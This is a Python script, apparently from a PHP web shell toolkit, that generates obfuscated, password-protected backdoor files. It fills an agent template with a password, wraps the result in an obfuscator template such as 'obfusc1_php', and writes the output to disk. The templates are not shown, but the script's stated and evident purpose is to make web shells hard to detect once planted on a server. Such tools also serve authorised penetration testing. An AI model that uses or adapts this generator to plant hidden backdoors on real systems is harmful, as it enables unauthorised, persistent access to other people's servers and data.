#!/usr/bin/env python

"""Generate obfuscated backdoor.

Usage:
  generate.py <password> <output file> 
  generate.py <password> <output file> [--obfuscator=<obfuscator> --agent=<agent>]
  
Options:
  --obfuscator=<obfuscator>    Backdoor obfuscator [default: obfusc1_php].
  --agent=<agent>              Backdoor agent [default: stegaref_php].

"""

from mako.template import Template
from core.weexceptions import FatalException
from core import messages
import getopt
import core.log
import logging
import os
import sys

agent_templates_folder_path = 'bd/agents/'
obfuscators_templates_folder_path = 'bd/obfuscators/'


def generate(password, obfuscator = 'obfusc1_php', agent = 'stegaref_php'):

    
    obfuscator_path = os.path.join(obfuscators_templates_folder_path, obfuscator + '.tpl')
    agent_path = os.path.join(agent_templates_folder_path, agent + '.tpl')
    
    for path in (obfuscator_path, agent_path):
        if not os.path.isfile(path):
            raise FatalException(messages.generic.file_s_not_found % path)
        
    obfuscator_template = Template(filename=obfuscator_path)
    
    
    try:
        agent = Template(open(agent_path,'r').read()).render(password = password)
    except Exception as e:
        raise FatalException(messages.generate.error_agent_template_s_s % (agent_path, str(e)))

    agent = agent.strip(os.linesep)

    try:
        obfuscated = obfuscator_template.render(agent = agent)
    except Exception as e:
        raise FatalException(messages.generate.error_obfuscator_template_s_s % (obfuscator_path, str(e)))
         
    return obfuscated
         
def save_generated(obfuscated, output):
    
    try:
        open(output, 'w+').write(obfuscated)
    except Exception as e:
        raise FatalException(messages.generic.error_creating_file_s_s % (output, e))
         
if __name__ == '__main__':
    
    try:
        line_args_optional, line_args_mandatory = getopt.getopt(sys.argv[1:], '', [ 'obfuscator=', 'agent=' ])
    except getopt.GetoptError as e:
        logging.info('%s\n%s' % (e, __doc__))
    else:
    
        if len(line_args_mandatory) != 2:
            logging.info('%s\n%s' % (messages.generic.error_missing_arguments_s % '', __doc__))
        else:    
            password, output = line_args_mandatory
            dict_args_optionals = dict((key.strip('-'), value) for (key, value) in line_args_optional)
            
            obfuscated = generate(password, **dict_args_optionals)
            save_generated(obfuscated, output)
            
            logging.info(messages.generate.generated_backdoor_with_password_s_in_s_size_i % (password, output, len(obfuscated)))
        
        
